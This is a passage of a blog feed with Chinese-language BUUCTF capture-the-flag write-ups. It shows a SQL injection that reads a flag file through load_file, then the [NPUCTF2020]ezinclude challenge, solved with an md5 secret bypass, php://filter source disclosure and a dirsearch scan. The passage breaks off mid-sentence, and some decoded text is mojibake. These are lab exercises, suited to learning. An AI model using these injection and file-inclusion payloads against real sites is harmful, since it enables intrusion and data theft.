00000000000000000010000002000000001000000400000000100000080000000010000010000000001000002000000000100000400000000000000000100001000000000010000200000000001000040000000000100008000000000010001000000000001000200000000000100040000000000010008000000000001001000000000000100200000000000010040000000000001008000000000000101000000000000010200000000000001040000000000000108000000000000011000000000000001200000000000000140000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000100B000000450000040A000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000104445344420000000100000000000000000000000000000000000000000000000200000020000000600000000000000001000000800000000100000100000000010000020000000000000000020000080000001800000000000000000100002000000000010000400000000001000080000000000100010000000000010002000000000001000400000000000100080000000000010010000000000001002000000000000100400000000000010080000000000001010000000000000102000000000000010400000000000001080000000000000110000000000000012000000000000001400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<br></code></pre></td></tr></table></figure><h3 id="16è¿›åˆ¶è§£ç "><a href="#16è¿›åˆ¶è§£ç " class="headerlink" title="16è¿›åˆ¶è§£ç :"></a>16è¿›åˆ¶è§£ç :</h3><p><strong>ä½¿ç”¨bpçš„asciiç 16è¿›åˆ¶è§£ç </strong></p><p><img src="/images/2024-2-18/image-20240208224711172.png" alt="image-20240208224711172"></p><p>å¯¹è¿™äº›é¡¹ç›®æ–‡ä»¶è¿›è¡Œè§‚å¯Ÿï¼Œå‘ç°ä¸€ä¸ªè·Ÿflagç›¸å…³çš„æ–‡ä»¶:</p><p><img src="/images/2024-2-18/image-20240208224815804.png" alt="image-20240208224815804"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag_8946e1ff1ee3e40f.php<br></code></pre></td></tr></table></figure><p>è¯¥æ–‡ä»¶å­˜åœ¨äº&#x2F;tmp&#x2F;html&#x2F;ç›®å½•ä¸‹ä»¥åŠ&#x2F;var&#x2F;www&#x2F;html&#x2F;ç›®å½•ä¸‹ï¼Œè·å–è¿™ä¸¤ä¸ªç›®å½•ä¸­çš„ä»»æ„ä¸€ä¸ªæ–‡ä»¶å°±å¯ä»¥äº†</p><h2 id="è·å–-tmp-html-ç›®å½•ä¸‹çš„flag-8946e1ff1ee3e40f-phpï¼š"><a href="#è·å–-tmp-html-ç›®å½•ä¸‹çš„flag-8946e1ff1ee3e40f-phpï¼š" class="headerlink" title="è·å–&#x2F;tmp&#x2F;html&#x2F;ç›®å½•ä¸‹çš„flag_8946e1ff1ee3e40f.phpï¼š"></a>è·å–&#x2F;tmp&#x2F;html&#x2F;ç›®å½•ä¸‹çš„flag_8946e1ff1ee3e40f.phpï¼š</h2><h3 id="payload1-3"><a href="#payload1-3" class="headerlink" title="payload1:"></a>payload1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=((select(hex(load_file(&quot;/tmp/html/flag_8946e1ff1ee3e40f.php&quot;))))),/*&amp;content=666<br></code></pre></td></tr></table></figure><h3 id="payload2-6"><a href="#payload2-6" class="headerlink" title="payload2:"></a>payload2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=16<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208225236611.png" alt="image-20240208225236611"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">3C3F7068700A24666C6167203D2027666C61677B66396361316136622D396437382D313165382D393061332D6334623330316237623939627D273B0A3F3E0A<br></code></pre></td></tr></table></figure><h3 id="16è¿›åˆ¶è§£ç -1"><a href="#16è¿›åˆ¶è§£ç -1" class="headerlink" title="16è¿›åˆ¶è§£ç :"></a>16è¿›åˆ¶è§£ç :</h3><p><img src="/images/2024-2-18/image-20240208225359567.png" alt="image-20240208225359567"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php<br>$flag = &#x27;flag&#123;f9ca1a6b-9d78-11e8-90a3-c4b301b7b99b&#125;&#x27;;<br>?&gt;<br></code></pre></td></tr></table></figure><p>flag&#x3D;flag{f9ca1a6b-9d78-11e8-90a3-c4b301b7b99b}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[NPUCTF2020]ezinclude</title>
    <link href="/2024/02/18/2024-02-18-%5BNPUCTF2020%5Dezinclude/"/>
    <url>/2024/02/18/2024-02-18-%5BNPUCTF2020%5Dezinclude/</url>
    
    <content type="html"><![CDATA[<h1 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h1><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ:"></a>å‚è€ƒ:</h2><p>[<a href="https://blog.csdn.net/weixin_45646006/article/details/120817553">NPUCTF2020]ezinclude-CSDNåšå®¢</a></p><p><a href="https://github.com/H4ckForJob/dirmap/blob/master/data/">https://github.com/H4ckForJob/dirmap/blob/master/data/</a></p><p>[<a href="https://www.shawroot.cc/1159.html">NPUCTF2020]ezincludeï¼ˆPHPä¸´æ—¶æ–‡ä»¶åŒ…å«ï¼‰ â€“ ã€Œé…æªæœ±ä¸½å¶ã€‚ã€ (shawroot.cc)</a></p><h2 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯:"></a>åœºæ™¯:</h2><p><img src="/images/2024-2-18/image-20240206143845264.png" alt="image-20240206143845264"></p><h2 id="æŸ¥çœ‹ç½‘é¡µæºä»£ç "><a href="#æŸ¥çœ‹ç½‘é¡µæºä»£ç " class="headerlink" title="æŸ¥çœ‹ç½‘é¡µæºä»£ç :"></a>æŸ¥çœ‹ç½‘é¡µæºä»£ç :</h2><p><img src="/images/2024-2-18/image-20240206143907330.png" alt="image-20240206143907330"></p><p>å¾—åˆ°æç¤ºä¿¡æ¯:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;!--md5($secret.$name)===$pass --&gt;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ±‚æˆ‘ä»¬$secret.$nameçš„md5å€¼è¦å’Œ$passç›¸ç­‰</p><h3 id="çŒœæµ‹"><a href="#çŒœæµ‹" class="headerlink" title="çŒœæµ‹:"></a>çŒœæµ‹:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">å¦‚æœ$nameå’Œ$passçš„å‚æ•°æˆ‘ä»¬ä¸å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†æ— æ³•ç»•è¿‡è¿™ä¸ªåˆ¤æ–­ï¼Œå³è¿™ä¸ªæç¤ºå°±æ²¡æœ‰ä»»ä½•çš„æ„ä¹‰(å› ä¸ºæˆ‘å·²ç»å¯¹ç½‘ç«™çš„åå°æ–‡ä»¶éƒ½è¿›è¡Œæ‰«æè¿˜æ˜¯æ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„æ–‡ä»¶)ï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ªå‚æ•°å¿…é¡»å¯æ§ï¼Œç°åœ¨å‡è®¾æˆ‘ä»¬å¯ä»¥è¾“å…¥è¿™ä¸¤ä¸ªå‚æ•°çš„å€¼ï¼Œ$nameæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿéœ€è¦çŸ¥é“$secret.$nameçš„md5çš„å€¼æ‰å¯ä»¥è¾“å…¥$passçš„å€¼ï¼Œå¦‚æœæˆ‘ä»¬å…ˆè¾“å…¥$passçš„å€¼ï¼Œä½†æ˜¯ç”±äºä¸çŸ¥é“$secretçš„å€¼ï¼Œæ‰€ä»¥æ— æ³•è¾“å…¥$nameçš„å€¼ï¼Œæ‰€ä»¥å¦‚æœè¦è®©è¿™ä¸ªæç¤ºå­˜åœ¨æ„ä¹‰ï¼Œé‚£ä¹ˆå°±æ˜¯æˆ‘ä»¬è¾“å…¥$nameçš„å€¼ï¼ŒåŒæ—¶è·å–åˆ°$secret.$nameçš„åŠ å¯†å€¼<br></code></pre></td></tr></table></figure><h2 id="BPæŠ“åŒ…è¿›ä¸€æ­¥æ”¶é›†ä¿¡æ¯"><a href="#BPæŠ“åŒ…è¿›ä¸€æ­¥æ”¶é›†ä¿¡æ¯" class="headerlink" title="BPæŠ“åŒ…è¿›ä¸€æ­¥æ”¶é›†ä¿¡æ¯:"></a>BPæŠ“åŒ…è¿›ä¸€æ­¥æ”¶é›†ä¿¡æ¯:</h2><p><img src="/images/2024-2-18/image-20240206144517403.png" alt="image-20240206144517403"></p><p>å‘ç°cookieå­˜åœ¨ä¸€ä¸ªhashå€¼</p><h3 id="éšæ„è¾“å…¥ä¸€ä¸ªnameçš„å€¼"><a href="#éšæ„è¾“å…¥ä¸€ä¸ªnameçš„å€¼" class="headerlink" title="éšæ„è¾“å…¥ä¸€ä¸ªnameçš„å€¼:"></a>éšæ„è¾“å…¥ä¸€ä¸ªnameçš„å€¼:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=1<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206144623159.png" alt="image-20240206144623159"></p><p>å‘ç°å“åº”ç»“æœä¸­å­˜åœ¨ä¸€ä¸ªSet-Cookie: Hash&#x3D;576322dd496b99d07b5b0f7fa7934a25;</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=2<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206144721294.png" alt="image-20240206144721294"></p><p>å‘ç°ä¸åŒçš„nameå›æ˜¾ä¸åŒçš„set-cookieå€¼ï¼ŒçŒœæµ‹è¯¥hashå€¼å°±æ˜¯$secret.$nameçš„md5åŠ å¯†å€¼</p><h2 id="éªŒè¯çŒœæµ‹"><a href="#éªŒè¯çŒœæµ‹" class="headerlink" title="éªŒè¯çŒœæµ‹:"></a>éªŒè¯çŒœæµ‹:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=1&amp;pass=576322dd496b99d07b5b0f7fa7934a25<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206144858912.png" alt="image-20240206144858912"></p><p>æˆåŠŸå›æ˜¾ä¸€ä¸ªæ–‡ä»¶ä¿¡æ¯:flflflflag.php</p><h2 id="è®¿é—®flflflflag-phpï¼š"><a href="#è®¿é—®flflflflag-phpï¼š" class="headerlink" title="è®¿é—®flflflflag.phpï¼š"></a>è®¿é—®flflflflag.phpï¼š</h2><p><img src="/images/2024-2-18/image-20240206145214434.png" alt="image-20240206145214434"></p><p>ç›´æ¥è·³è½¬åˆ°404.htmlä¸Šäº†ï¼Œæ²¡æœ‰è®¿é—®flflflflag.phpï¼Œå¯èƒ½æ˜¯ç›´æ¥è¿›è¡Œè·³è½¬äº†ï¼Œå¯ä»¥ç”¨æŠ“åŒ…æ‹¦æˆªä¸€ä¸‹</p><h2 id="BPæŠ“åŒ…æ‹¦æˆªflflflflag-phpï¼š"><a href="#BPæŠ“åŒ…æ‹¦æˆªflflflflag-phpï¼š" class="headerlink" title="BPæŠ“åŒ…æ‹¦æˆªflflflflag.phpï¼š"></a>BPæŠ“åŒ…æ‹¦æˆªflflflflag.phpï¼š</h2><p><img src="/images/2024-2-18/image-20240206145342309.png" alt="image-20240206145342309"></p><p>æ ¹æ®å“åº”åŒ…å†…å®¹ç¡®å®è·å–åˆ°ï¼Œè®¿é—®è¯¥é¡µé¢æ—¶ä¼šè‡ªåŠ¨è·³è½¬åˆ°404.html,åŒæ—¶è·å¾—æç¤ºä¿¡æ¯:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">include($_GET[&quot;file&quot;])<br></code></pre></td></tr></table></figure><p>è¯¥æ–‡ä»¶å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p><h2 id="æ„é€ æ–‡ä»¶åŒ…å«payload"><a href="#æ„é€ æ–‡ä»¶åŒ…å«payload" class="headerlink" title="æ„é€ æ–‡ä»¶åŒ…å«payload:"></a>æ„é€ æ–‡ä»¶åŒ…å«payload:</h2><p><strong>ç”±äºæˆ‘ä»¬ç°åœ¨åªçŸ¥é“ä¸€ä¸ªindex.phpå’Œflflflflag.phpï¼Œæ‰€ä»¥å…ˆè·å–è¿™ä¸¤ä¸ªæ–‡ä»¶çš„ä¿¡æ¯</strong></p><h3 id="è·å–flflflflag-phpä¿¡æ¯payload1"><a href="#è·å–flflflflag-phpä¿¡æ¯payload1" class="headerlink" title="è·å–flflflflag.phpä¿¡æ¯payload1:"></a>è·å–flflflflag.phpä¿¡æ¯payload1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flflflflag.php?file=php://filter/read=convert.base64-encode/resource=./flflflflag.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206145854174.png" alt="image-20240206145854174"></p><h4 id="å›æ˜¾å†…å®¹"><a href="#å›æ˜¾å†…å®¹" class="headerlink" title="å›æ˜¾å†…å®¹:"></a>å›æ˜¾å†…å®¹:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">PGh0bWw+CjxoZWFkPgo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0IiB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmPSI0MDQuaHRtbCI7Cjwvc2NyaXB0Pgo8dGl0bGU+dGhpc19pc19ub3RfZmw0Z19hbmRf5Ye66aKY5Lq6X3dhbnRzX2dpcmxmcmllbmQ8L3RpdGxlPgo8L2hlYWQ+Cjw+Cjxib2R5Pgo8P3BocAokZmlsZT0kX0dFVFsnZmlsZSddOwppZihwcmVnX21hdGNoKCcvZGF0YXxpbnB1dHx6aXAvaXMnLCRmaWxlKSl7CglkaWUoJ25vbm9ubycpOwp9CkBpbmNsdWRlKCRmaWxlKTsKZWNobyAnaW5jbHVkZSgkX0dFVFsiZmlsZSJdKSc7Cj8+CjwvYm9keT4KPC9odG1sPgo=<br></code></pre></td></tr></table></figure><h4 id="base64è§£ç "><a href="#base64è§£ç " class="headerlink" title="base64è§£ç :"></a>base64è§£ç :</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;script language=<span class="hljs-string">&quot;javascript&quot;</span> type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>           window.location.href=<span class="hljs-string">&quot;404.html&quot;</span>;<br>&lt;/script&gt;<br>&lt;title&gt;this_is_not_fl4g_and_é‘æ´ªî•½æµœç¯²wants_girlfriend&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data|input|zip/is&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br>&#125;<br>@<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="è·å–index-phpæ–‡ä»¶ä¿¡æ¯paylaod2"><a href="#è·å–index-phpæ–‡ä»¶ä¿¡æ¯paylaod2" class="headerlink" title="è·å–index.phpæ–‡ä»¶ä¿¡æ¯paylaod2:"></a>è·å–index.phpæ–‡ä»¶ä¿¡æ¯paylaod2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flflflflag.php?file=php://filter/read=convert.base64-encode/resource=./index.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206150245971.png" alt="image-20240206150245971"></p><h4 id="å›æ˜¾å†…å®¹-1"><a href="#å›æ˜¾å†…å®¹-1" class="headerlink" title="å›æ˜¾å†…å®¹:"></a>å›æ˜¾å†…å®¹:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">PD9waHAKaW5jbHVkZSAnY29uZmlnLnBocCc7CkAkbmFtZT0kX0dFVFsnbmFtZSddOwpAJHBhc3M9JF9HRVRbJ3Bhc3MnXTsKaWYobWQ1KCRzZWNyZXQuJG5hbWUpPT09JHBhc3MpewoJZWNobyAnPHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCIgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZj0iZmxmbGZsZmxhZy5waHAiOwoJPC9zY3JpcHQ Cic7Cn1lbHNlewoJc2V0Y29va2llKCJIYXNoIixtZDUoJHNlY3JldC4kbmFtZSksdGltZSgpKzM2MDAwMDApOwoJZWNobyAidXNlcm5hbWUvcGFzc3dvcmQgZXJyb3IiOwp9Cj8 CjxodG1sPgo8IS0tbWQ1KCRzZWNyZXQuJG5hbWUpPT09JHBhc3MgLS0 CjwvaHRtbD4K<br></code></pre></td></tr></table></figure><h4 id="base64è§£ç -1"><a href="#base64è§£ç -1" class="headerlink" title="base64è§£ç :"></a>base64è§£ç :</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<br>@<span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>@<span class="hljs-variable">$pass</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$secret</span>.<span class="hljs-variable">$name</span>)===<span class="hljs-variable">$pass</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="hljs-string">           window.location.href=&quot;flflflflag.php&quot;;</span><br><span class="hljs-string">&lt;/scriptå£©è¼Y[è³Œèœ\è³‹åœ¹è°®YJ?\??Y</span><br><span class="hljs-string">Jè³†è»]?æ¦ŒYJK[YJ</span><br><span class="hljs-string">Jæ?</span><br><span class="hljs-string">NèœYX??æ¼’è³Šæ´[YK?\èŒŒåœ®?\æ¹œè»‹å¹çƒå¾–ï¼¦å˜‘ç½®å•µ?æŠ‘è«§Rä¾´6V7&amp;WBé‡¬?è«¶æ’šå³G72å€š(é¸¾âŠ™è›‹?</span><br></code></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨ä¸€ä¸ªconfig.php,æˆ‘ä»¬å¯ä»¥è¯»å–ä¸€ä¸‹</p><h3 id="è·å–config-phpä¿¡æ¯payload3"><a href="#è·å–config-phpä¿¡æ¯payload3" class="headerlink" title="è·å–config.phpä¿¡æ¯payload3:"></a>è·å–config.phpä¿¡æ¯payload3:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flflflflag.php?file=php://filter/read=convert.base64-encode/resource=./config.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206150606969.png" alt="image-20240206150606969"></p><h4 id="å›æ˜¾å†…å®¹-2"><a href="#å›æ˜¾å†…å®¹-2" class="headerlink" title="å›æ˜¾å†…å®¹:"></a>å›æ˜¾å†…å®¹:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">PD9waHAKJHNlY3JldD0nJV4kJiQjZmZmZGZsYWdfaXNfbm90X2hlcmVfaGFfaGEnOwo/Pgo=<br></code></pre></td></tr></table></figure><h4 id="base64è§£ç ï¼š"><a href="#base64è§£ç ï¼š" class="headerlink" title="base64è§£ç ï¼š"></a>base64è§£ç ï¼š</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$secret</span>=<span class="hljs-string">&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ‰€æœ‰çš„æ–‡ä»¶ä¿¡æ¯éƒ½è·å–äº†ï¼Œä½†æ˜¯ä¾ç„¶æ²¡æœ‰flagçš„ä¿¡æ¯ã€‚</p><h2 id="ä½¿ç”¨dirseaché‡æ–°æ‰«æç½‘ç«™ï¼š"><a href="#ä½¿ç”¨dirseaché‡æ–°æ‰«æç½‘ç«™ï¼š" class="headerlink" title="ä½¿ç”¨dirseaché‡æ–°æ‰«æç½‘ç«™ï¼š"></a>ä½¿ç”¨dirseaché‡æ–°æ‰«æç½‘ç«™ï¼š</h2><p><strong>(è¿™é‡Œä½¿ç”¨æ–°ä¸‹è½½çš„å­—å…¸dict_mode_dict.txt)</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">python dirsearch.py -u http://5e0508ab-7d6c-471a-906b-cdfbed6e8c50.node5.buuoj.cn:81/ -e * --timeout=3 -t 1 -x 400,403,404,500,503,429 -w ./dict_mode_dict.txt<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206160429411.png" alt="image-20240206160429411"></p><p>æ‰«äº†ä¸¤æ¬¡æ‰å‡ºæ¥ï¼Œä»¥åçœ‹æ¥éƒ½å¾—è‡³å°‘æ‰«ä¸¤æ¬¡ï¼Œå‘ç°ä¸€ä¸ªdir.phpæ–‡ä»¶</p><h2 id="ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è·å–dir-phpæ–‡ä»¶ä¿¡æ¯"><a href="#ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è·å–dir-phpæ–‡ä»¶ä¿¡æ¯" class="headerlink" title="ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è·å–dir.phpæ–‡ä»¶ä¿¡æ¯:"></a>ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è·å–dir.phpæ–‡ä»¶ä¿¡æ¯:</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flflflflag.php?file=php://filter/read=convert.base64-encode/resource=./dir.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206160708008.png" alt="image-20240206160708008"></p><h3 id="å›æ˜¾å†…å®¹-3"><a href="#å›æ˜¾å†…å®¹-3" class="headerlink" title="å›æ˜¾å†…å®¹:"></a>å›æ˜¾å†…å®¹:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">PD9waHANCnZhcl9kdW1wKHNjYW5kaXIoJy90bXAnKSk7DQo/Pg==<br></code></pre></td></tr></table></figure><h3 id="base64è§£å¯†"><a href="#base64è§£å¯†" class="headerlink" title="base64è§£å¯†:"></a>base64è§£å¯†:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="çŸ¥è¯†ç‚¹ä»‹ç»"><a href="#çŸ¥è¯†ç‚¹ä»‹ç»" class="headerlink" title="çŸ¥è¯†ç‚¹ä»‹ç»:"></a>çŸ¥è¯†ç‚¹ä»‹ç»:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">var_dump(scandir(&#x27;/tmp&#x27;));<br>var_dump(scandir(&#x27;/tmp&#x27;)) è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯è·å–æŒ‡å®šç›®å½•ï¼ˆè¿™é‡Œæ˜¯ 